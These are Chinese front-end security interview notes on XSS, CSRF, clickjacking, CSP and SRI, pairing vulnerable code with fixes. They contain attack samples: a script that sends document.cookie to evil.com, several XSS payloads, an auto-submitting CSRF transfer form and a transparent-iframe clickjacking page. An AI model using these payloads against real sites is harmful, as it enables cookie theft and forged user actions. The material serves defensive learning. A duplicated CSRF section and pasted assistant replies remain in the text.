

## 一、存储型 XSS（Stored XSS）

**像有人在小区公告栏贴了一个二维码，所有扫的人都会掉进陷阱**

**核心特征：** 恶意代码被永久存储到数据库/文件中，页面渲染时取出并执行。
**攻击链条：** 黑客输入恶意代码 → 存入服务器 → 其他用户访问页面 → 恶意代码随页面返回 → 浏览器执行。
**修复：** 后端富文本白名单过滤 + 前端 DOMPurify 双保险；

### 案例 1：博客评论区

- **攻击：** 评论提交 `<script>fetch('https://evil.com?c='+document.cookie)</script>`
- **存储：** 评论入库。
- **触发：** 任意用户打开文章页时，评论区域直出 HTML 执行脚本。

```js
// ❌ 后端/模板（示例：Express + EJS/Pug 等同理）- 危险直出
res.send(`
  <div class="comments">
    ${comments.map(c => `<div class="item">${c.content}</div>`).join('')}
  </div>
`);
```

**修复（前端/后端）：**

```js
// ✅ 输出转义（伪实现）
const escapeHTML = s => s.replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
res.send(`
  <div class="comments">
    ${comments.map(c => `<div class="item">${escapeHTML(c.content)}</div>`).join('')}
  </div>
`);
```

### 案例 2：用户昵称/简介显示处

- **攻击：** 昵称设为 `<img src=x onerror=alert(1)>`
- **存储：** 昵称字段入库。
- **触发：** 任意列表/头像 hover 卡片/聊天窗口显示昵称时触发。

```jsx
// ❌ React 里用 dangerouslySetInnerHTML 直插用户输入（危险）
<div dangerouslySetInnerHTML={{ __html: user.nickname }} />

// ✅ React 正常插值会自动转义
<div>{user.nickname}</div>
```

### 案例 3：站内信/私信

- **攻击：** 私信内容写 `<script>...</script>`
- **存储：** 信件入库。
- **触发：** 收件人打开“收件箱”或“信件详情”直出 HTML。

```js
// ❌ 直接 innerHTML 渲染富文本（危险）
msgContainer.innerHTML = message.content;

// ✅ 使用 DOMPurify 白名单清洗（前端）
msgContainer.innerHTML = DOMPurify.sanitize(message.content);
```

### 案例 4：电商评价/商品 Q&A

- **攻击：** 评价文本含 `<svg onload=alert(1)>`
- **触发：** 商品详情页下方“评价列表”加载时执行。

------

## 二、反射型 XSS（Reflected XSS）

**像是镜子里反射的光，要有人帮你“照一眼”才会伤到你。**

**核心特征：** 恶意代码放在 URL/参数里，服务器把参数原样回显到页面，需诱导用户点击。
**攻击链条：** 构造恶意 URL → 诱导点击 → 服务器回显参数 → 浏览器执行。
**修复：** 一律转义回显字段；敏感页禁用内联脚本配合 CSP。

### 案例 1：搜索结果回显

- **攻击 URL：**
   `https://site.com/search?q=<img src=x onerror=alert(1)>`

```js
// ❌ 服务器模板
res.send(`<h1>Results for: ${req.query.q}</h1>`);

// ✅ 转义输出
res.send(`<h1>Results for: ${escapeHTML(req.query.q)}</h1>`);
```

### 案例 2：错误提示页

- **攻击 URL：**
   `https://site.com/error?message=<script>alert(1)</script>`

```js
// ❌
res.send(`<p>${req.query.message}</p>`);
// ✅
res.send(`<p>${escapeHTML(req.query.message)}</p>`);
```

### 案例 3：跳转参数（Open Redirect + XSS）

- **攻击 URL：**
   `https://site.com/redirect?url=javascript:alert(1)`

```js
// ❌ 直接拼接
window.location = new URLSearchParams(location.search).get('url');

// ✅ 白名单域名 or 仅允许 https 并剔除 javascript:
const raw = new URLSearchParams(location.search).get('url') || '/';
try {
  const u = new URL(raw, location.origin);
  if (u.origin === location.origin) location.href = u.href;
  else location.href = '/';
} catch { location.href = '/'; }
```

### 案例 4：邮件/IM 钓鱼链接

- **攻击：** “重置密码”链接里塞脚本参数；若站点回显该参数，就在官方域上执行脚本。

------

## 三、DOM 型 XSS（DOM-based XSS）

**核心特征：** 服务端返回正常；前端把用户可控来源（hash/search/referrer/localStorage 等）不安全地插入 DOM 导致执行。
**攻击链条：** 构造恶意 URL → 用户点击 → 前端 `innerHTML/document.write/eval` 等 → 执行。

### 案例 1：基于 Hash 的高亮

- **攻击 URL：** `https://site.com/page#<img src=x onerror=alert(1)>`

```js
// ❌
output.innerHTML = location.hash.slice(1);
// ✅
output.textContent = location.hash.slice(1);
```

### 案例 2：document.write 输出参数

- **攻击 URL：** `https://site.com/welcome?name=<script>alert(1)</script>`

```js
// ❌
document.write('Hello, ' + new URLSearchParams(location.search).get('name'));
// ✅
document.write('Hello, ' + escapeHTML(new URLSearchParams(location.search).get('name') || ''));
```

### 案例 3：动态构造链接（javascript: 协议）

- **攻击 URL：** `https://site.com/#javascript:alert(1)`

```js
// ❌
a.href = location.hash.slice(1);
// ✅ 只允许 http/https/mailto 等
const cand = location.hash.slice(1);
try {
  const u = new URL(cand, location.origin);
  if (['http:', 'https:'].includes(u.protocol)) a.href = u.href;
} catch {}
```

### 案例 4：jQuery `.html()`/Vue `v-html`/React dangerouslySetInnerHTML

```js
// ❌ jQuery
$('#box').html(location.search);
// ✅
$('#box').text(new URLSearchParams(location.search).get('q') || '');
<!-- ❌ Vue -->
<div v-html="dangerousHtml"></div>
<!-- ✅ Vue -->
<div>{{ safeText }}</div>
// ❌ React
<div dangerouslySetInnerHTML={{ __html: userHtml }} />
// ✅ React
<div>{text}</div>
// ✅ 必须富文本时：DOMPurify
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userHtml) }} />
```

### 案例 5：eval/new Function

```js
// ❌
const code = new URLSearchParams(location.search).get('js');
eval(code);
// ✅
/* 不使用 eval；若必须，限定白名单指令并在服务端生成 */
```

------

## 四、CSRF（跨站请求伪造）

**你睡觉时有人冒充你下单，商家还真送货。**

**核心特征：** 借助浏览器自动带 Cookie/Session 的特性，诱导已登录用户在不知情下向目标站发请求。
**攻击链条：** **用户已登录 → 访问恶意站** → 恶意站发起跨站请求 → 浏览器自动带上 Cookie → 目标站误以为是用户操作。

### 案例 1：自动转账（POST 表单）

```html
<!-- 恶意页面 -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>f.submit()</script>
```

### 案例 2：GET 触发（错误实践）

```html
<!-- 恶意页面，若目标站用 GET 做敏感操作会中招 -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```

好的👌 我帮你把 **CSRF → 防护措施** 那一段重写一下，把 **SameSite Cookie** 的细节融进去，既有理论解释，又有面试友好的总结。这样你在答题时能很自然地展开。

------

## 四、CSRF（跨站请求伪造）

**你睡觉时有人冒充你下单，商家还真送货。**

**核心特征：** 借助浏览器自动带 Cookie/Session 的特性，诱导已登录用户在不知情下向目标站发请求。
 **攻击链条：** 用户已登录 → 访问恶意站 → 恶意站发起跨站请求 → 浏览器自动带上 Cookie → 目标站误以为是用户操作。

------

### 案例：自动转账（POST 表单）

```html
<!-- 恶意页面 -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>f.submit()</script>
```

只要用户在 `bank.com` 登录过，访问这个页面时浏览器就会自动带上合法的 Cookie，银行后台就会认为这是用户本人操作。

------

### 防护措施（要组合使用）

1. **CSRF Token（最核心）**

   - 服务端为用户生成随机 token，保存在 session 中。
   - 前端在表单或 AJAX 请求中带上 token。
   - 服务端校验 token 是否匹配。
      **面试回答：** “CSRF Token 是最常见的防御手段，因为攻击者拿不到 token。”

   ```html
   <input type="hidden" name="csrf_token" value="{{csrfToken}}">
   ```

2. **SameSite Cookie（浏览器级缓解）**

   - 限制 Cookie 在跨站请求中是否能被携带。
   - 三种模式：
     - **Strict**：完全禁止跨站请求带 cookie（最安全，但外链登录体验差）。
     - **Lax**（默认）：大多数跨站请求不带 cookie，但顶级导航的 GET 请求允许（比如用户从别的站点点击一个链接到你的站点时，浏览器通常会发送 Cookie）。
     - **None; Secure**：允许跨站请求，但必须是 HTTPS，用于支付回调、SSO、iframe 场景。

   **如何在服务端设置（示例）**

   **HTTP 响应头（直接）**

   ```http
   Set-Cookie: session=abc123; Path=/; HttpOnly; Secure; SameSite=Lax
   ```

   **Node/Express（示例）**

   ```js
   // Express cookie 设置
   res.cookie('session', 'abc123', {
     httpOnly: true,
     secure: true,      // HTTPS 必须
     sameSite: 'lax',   // 'strict' | 'lax' | 'none'
     maxAge: 24*3600*1000
   });
   ```

   **面试提示：**

   - “SameSite 能缓解 CSRF，但不是万能解，仍需配合 Token。”
   - “跨站嵌入场景（支付/SSO）要用 `None; Secure`，否则业务会挂。”

3. **Referer/Origin 校验（辅助手段）**

   - 服务端校验请求头的来源域名是否可信。
   - 缺点：有些代理或客户端可能会删掉 Referer。

4. **二次确认 / 动作验证**

   - 对转账、改密等高危操作增加验证码、短信、OTP。
   - 面试可以说：“这是兜底方案，不依赖浏览器，而是让用户显式确认。”

5. **避免 GET 产生副作用**

   - 不要用 GET 请求做删除、转账等操作。
   - 因为 GET 请求容易被 `<img>`、`<a>`、搜索引擎爬虫意外触发。

------

### 典型场景与选择建议（实战）

- **普通网站登录 session**：推荐 `SameSite=Lax; Secure; HttpOnly` —— 兼顾安全和用户从外部链接回站的体验。
- **非常敏感操作（比如修改重要账户信息）使用的短期凭证**：可设置 `SameSite=Strict`。
- **跨域登录/SSO、第三方支付回调、嵌入 iframe 需要携带 cookie 的场景**：必须 `SameSite=None; Secure`，同时增加 CSRF token / OAuth state 校验。
- **API 使用 token（Authorization header）而非 cookie**：可以避免 SameSite 的很多陷阱（推荐 SPA + token 的场景）。

------

### 真实问题与坑（面试亮点）

1. **支付/SSO 流程失败**：常见原因是把 session cookie 设成 `Lax/Strict`，导致第三方回调或 iframe 场景不带 cookie，用户无法维持登录或授权失败。
2. **不设 `SameSite` 的副作用**：现代浏览器可能用更严格默认处理，导致跨站登录体验异常。
3. **`SameSite=None` 要配 `Secure`**：否则 cookie 会被浏览器忽略。
4. **老浏览器兼容问题**：一些老旧浏览器/内嵌 WebView 对 `SameSite=None` 的兼容性不一致，需测试（尤其是移动端某些厂商浏览器）。
5. **SameSite 不是万能**：它**不能防 XSS**（脚本能访问 cookie 的情况除外——但 `HttpOnly` cookie 浏览器 JS 无法读取，有助于防窃取）。

### 面试一页答法（总结）

- **一句话：** “CSRF 攻击利用浏览器自动带 cookie 的特性，SameSite 可以缓解，但最核心的是 CSRF Token + 二次确认。”
- **扩展答：**
  - “Strict 最安全但会影响用户体验；Lax 是浏览器默认值；None 必须配合 Secure 用于第三方集成。”
  - “实际开发里通常 Token + SameSite + HttpOnly Cookie + 二次确认同时使用。”

------

## 五、点击劫持（Clickjacking）

**你点领奖，其实在点“删号”**

**核心特征：** 用透明/半透明的 iframe 覆盖在诱导按钮上，让用户“误点”目标站的敏感按钮。
**攻击链条：** 诱导页放“领取奖励”按钮 → 透明 iframe 覆盖其上加载目标页 → 用户点击 → 实际操作落在目标站。

### 案例 1：透明 iframe 诱导点击

```html
<!-- 恶意页面 -->
<style>
#bait { position:relative; width:240px; height:60px; background:#f00; color:#fff; line-height:60px; text-align:center; }
#ifr  { position:absolute; left:0; top:0; width:240px; height:60px; opacity:0; border:0; }
</style>
<div id="bait">点击领取大奖</div>
<iframe id="ifr" src="https://social.com/confirm-delete"></iframe>
```

### 案例 2：Likejacking（误赞/误关注）

- 同理，将社交站“点赞/关注”按钮位置对齐覆盖。

**防护（服务器首选，前端辅助手段）：**

- **HTTP 头：**
  - `X-Frame-Options: DENY` 或 `SAMEORIGIN`
  - **或** CSP：`Content-Security-Policy: frame-ancestors 'self' https://trusted.partner.com;`
- **前端检测（辅）：**

```js
if (window.top !== window.self) {
  // 拒绝在 iframe 中运行关键操作
  document.body.innerHTML = 'Blocked in iframe';
}
```

- **关键操作二次确认**：对删除/授权/支付弹确认对话框并校验非 iframe 环境。

------

## 面试用一页对照表

| 类别       | 核心特征                 | 典型源/触发                       | 最小危险代码                    | 首选修复                                                 |
| ---------- | ------------------------ | --------------------------------- | ------------------------------- | -------------------------------------------------------- |
| 存储型 XSS | 恶意入库，所有访问者执行 | 评论/昵称/私信/评价               | 直出 `innerHTML`/模板插值未转义 | 统一输出转义 + DOMPurify + HttpOnly Cookie               |
| 反射型 XSS | URL 参数回显执行         | 搜索/错误/跳转                    | `<h1>${q}</h1>`                 | 输出转义 + 跳转白名单 + CSP                              |
| DOM 型 XSS | 前端把可控数据写入 DOM   | hash/search/referrer/localStorage | `el.innerHTML = location.hash`  | 用 `textContent`/安全库 + 禁用 `eval`                    |
| CSRF       | 利用登录态伪造请求       | 自动提交表单/IMG 请求             | `<form ...>auto submit</form>`  | CSRF Token + SameSite Cookie + 二次确认                  |
| 点击劫持   | 透明 iframe 诱导点击     | 叠加按钮                          | `<iframe style="opacity:0">`    | `frame-ancestors`/`X-Frame-Options` + 非 iframe 执行校验 |

------



## 一、常见攻击方式

### 1. 什么是 XSS 攻击？有哪些类型？ 🔥

**一句话回答**
XSS（跨站脚本攻击）通过注入恶意脚本在浏览器执行，分为存储型、反射型、DOM 型。

**要点**

- 存储型：恶意代码存储在数据库。
- 反射型：恶意代码拼接在 URL，服务端返回。
- DOM 型：前端直接拼接执行。

**详细回答**

- 存储型：攻击代码写入评论区，所有访问者执行。
- 反射型：通过 URL 参数传入 `<script>`，页面回显时执行。
- DOM 型：前端 `innerHTML` 拼接时执行恶意代码。

**扩展/对比**

- 面试官常问：“如何防御 XSS？” 👉 转义、CSP、安全库（DOMPurify）。

---

### 2. 如何防御 XSS 攻击？ 🔥

**一句话回答**
通过转义输出、净化输入、CSP 策略限制执行源。

**要点**

- 输出转义。
- DOMPurify 净化。
- CSP 白名单。

**详细回答**

```js
// React JSX 默认转义
<div>{userInput}</div>

// 使用 DOMPurify
<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userInput)}} />
```

**扩展/对比**

- 面试官可能问：“为什么 React 默认安全？” 👉 因为 JSX 自动转义 HTML。

---

### 3. 什么是 CSRF 攻击？ 🔥

**一句话回答**
CSRF（跨站请求伪造）利用用户已登录身份，在不知情下发起恶意请求。

**要点**

- 依赖 Cookie 自动携带。
- 用户不知情。
- 常见在表单提交、转账请求。

**详细回答**
例子：攻击者引导用户访问带恶意 `<img src="http://bank.com/transfer?money=1000">`，浏览器自动带上 Cookie，完成转账。

**扩展/对比**

- 面试官可能问：“为什么 SameSite Cookie 可以防御 CSRF？” 👉 限制跨站请求携带 Cookie。

---

### 4. 如何防御 CSRF 攻击？ 🔥

**一句话回答**
通过 SameSite Cookie、CSRF Token、双重验证避免跨站伪造。

**要点**

- SameSite Cookie。
- CSRF Token。
- Referer 校验。

**详细回答**

- 设置 Cookie `SameSite=Strict` 或 `Lax`，避免跨站请求自动携带。
- 服务端返回 CSRF Token，前端请求时附带。
- 部分场景用验证码、二次确认。

**扩展/对比**

- 面试官可能问：“CSRF 和 XSS 的关系？” 👉 CSRF 需要受害者登录，XSS 不依赖。

---

### 5. 点击劫持攻击（Clickjacking）

**一句话回答**
点击劫持通过透明 iframe 引导用户误点敏感按钮。

**要点**

- iframe 叠加。
- 用户误操作。

**详细回答**
攻击者在页面中嵌入银行网站 iframe，并通过透明覆盖用户点击区域，诱导用户点击转账按钮。

**扩展/对比**

- 防御方法：`X-Frame-Options:DENY` 或 `Content-Security-Policy: frame-ancestors 'none'`。

---

### 6. 前端如何防御数据泄露 🔥

**一句话回答**
通过 HTTPS、加密存储、最小化数据暴露、脱敏展示。

**要点**

- HTTPS 传输。
- Token 放 HttpOnly Cookie。
- 本地存储加密。

**详细回答**

- 敏感数据（如身份证、手机号）前端仅做部分展示（掩码）。
- 避免把敏感信息写进 localStorage（容易被 XSS 读出）。

**扩展/对比**

- 面试官可能问：“为什么 Token 建议放 Cookie 而不是 localStorage？” 👉 HttpOnly 防止被 JS 读取。

---

## 二、浏览器安全机制

### 7. 什么是同源策略？ 🔥

**一句话回答**
同源策略限制不同源之间的 DOM、Cookie、LocalStorage 访问。

**要点**

- 协议、域名、端口必须相同。
- 保护用户数据安全。

**详细回答**

- 不同源不能互相访问 Cookie/LocalStorage。
- AJAX 请求跨域需 CORS 配置。

**扩展/对比**

- 面试官可能问：“如何解决跨域？” 👉 CORS / 代理 / JSONP。

---

太好了—我把你这两节 **CSP / SRI** 在不改你原有结构的前提下，补充成 **Node/Express 可直接复制** 的版本（含非破坏式上车：Report-Only、逐步收紧、支持 nonce 的内联脚本白名单、上报端点），并给出 **模板引擎/EJS 写法** 与 **前端标签上的 SRI** 用法。

你可以把下面整段直接粘到文档里（保持你原来的标题与“一句话回答/要点/详细回答/扩展”结构不变，只是新增“**Node/Express 实战**”小节）。

------

### 8. 什么是 CSP（Content Security Policy） 🔥

**一句话回答**
 CSP 限制页面可加载的资源来源，防御 XSS 注入。

**要点**

- 限制脚本来源。
- 限制样式、图片。
- 默认阻止内联脚本。

**详细回答**

```http
Content-Security-Policy: script-src 'self' https://cdn.example.com
```

**扩展/对比**

- 面试官可能问：“CSP 怎么限制内联脚本？” 👉 `script-src 'self'` + nonce/hash。

#### ✅ Node/Express 实战

> 推荐先“观察不拦截”（Report-Only），确认无误后再启用强制 CSP。支持为**每个响应**生成 nonce，并在模板里给必须的内联脚本加 `nonce` 白名单。

```ts
// app.js / index.ts
import express from 'express';
import crypto from 'crypto';

const app = express();

// 1) 生成每次响应的 nonce，并暴露给模板（res.locals）
app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64'); // 高熵随机串
  res.locals.nonce = nonce; // EJS/Pug 等模板可用 <%= nonce %>
  // 你的 CDN 域、上报端点按需替换
  const cspDirectives = [
    "default-src 'self'",
    `script-src 'self' https://cdn.example.com 'nonce-${nonce}'`, // 允许同源、CDN、以及带此 nonce 的内联脚本
    "style-src 'self'",                 // 如确有内联样式，谨慎加 'unsafe-inline' 或改用 nonce/hash
    "img-src 'self' data:",
    "font-src 'self' https://fonts.gstatic.com",
    "connect-src 'self' https://api.example.com",
    "object-src 'none'",
    "base-uri 'self'",
    "frame-ancestors 'self'",
    "upgrade-insecure-requests",        // 如全站 HTTPS，可开启
    "report-uri /__csp-report"          // 旧字段；现代推荐 report-to
  ].join("; ");

  // 2a) 先用 Report-Only 观察
  res.setHeader("Content-Security-Policy-Report-Only", cspDirectives);

  // 2b) 验证稳定后，改为强制：
  // res.setHeader("Content-Security-Policy", cspDirectives);

  next();
});

// 3) CSP 违规上报端点（可选，用于排查）
app.post('/__csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.warn('CSP VIOLATION:', JSON.stringify(req.body, null, 2));
  res.sendStatus(204);
});

// ... 你的路由与渲染逻辑
export default app;
```

**EJS 模板里使用 nonce 的示例：**

```ejs
<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Demo</title>
</head>
<body>
  <h1>Hello CSP</h1>

  <!-- 必须的内联脚本：加上服务器生成的 nonce -->
  <script nonce="<%= nonce %>">
    console.log('Boot with CSP nonce:', '<%= nonce %>');
  </script>

  <!-- 外链脚本：同样受 script-src 限制（见 SRI 小节） -->
  <script src="https://cdn.example.com/app.min.js"></script>
</body>
</html>
```

> 经验提示：
>
> - 能不用内联就不用；必须内联时统一走 `nonce`。
> - **不要使用** `unsafe-inline` / `unsafe-eval`，除非确认没有更好替代。
> - 逐步收紧：先收集上报（Report-Only），再改强制头。
> - 若页面被业务需要嵌入到特定合作域，可把 `frame-ancestors 'self'` 换为白名单域。

------

### 9. Subresource Integrity (SRI)

**一句话回答**
 SRI 通过校验资源哈希值，防止 CDN 资源被篡改。

**要点**

- `<script integrity>`。
- 结合 `crossorigin`。

**详细回答**

```html
<script src="cdn.js" integrity="sha384-abc..." crossorigin="anonymous"></script>
```

**扩展/对比**

- 面试官可能问：“为什么即使用 CDN 也需要 SRI？” 👉 防止 CDN 被攻击注入恶意代码。

#### ✅ 前端标签即可

> SRI 在 **HTML 标签** 上配置即可，Express 无需特殊处理。你只要把计算好的哈希填入 `integrity`。文件更新后必须同步更新哈希。

```ejs
<!-- EJS 模板例 -->
<script
  src="https://cdn.example.com/lib.min.js"
  integrity="sha384-KyZXEAg3QhqLMpG8r+Knujsl5+5hb7....."
  crossorigin="anonymous">
</script>

<link
  rel="stylesheet"
  href="https://cdn.example.com/lib.min.css"
  integrity="sha384-3q2+7w==....."
  crossorigin="anonymous">
```

**如何生成 `integrity` 哈希？（本地命令行）**

```bash
# 以 sha384 为例（推荐 sha384/sha512）
openssl dgst -sha384 -binary lib.min.js | openssl base64 -A
# 输出的值前面加上 "sha384-" 即可粘到 integrity
```

或使用 NPM 包（如 `subresource-integrity`）在构建阶段自动注入。

> 经验提示：
>
> - 为了减少维护成本，给“版本稳定、固定 URL”的第三方库配置 SRI；频繁变更的自家构建产物可先不加或通过自动化注入。
> - SRI 失配时浏览器会拒绝加载该资源，记得观察控制台 & 监控。

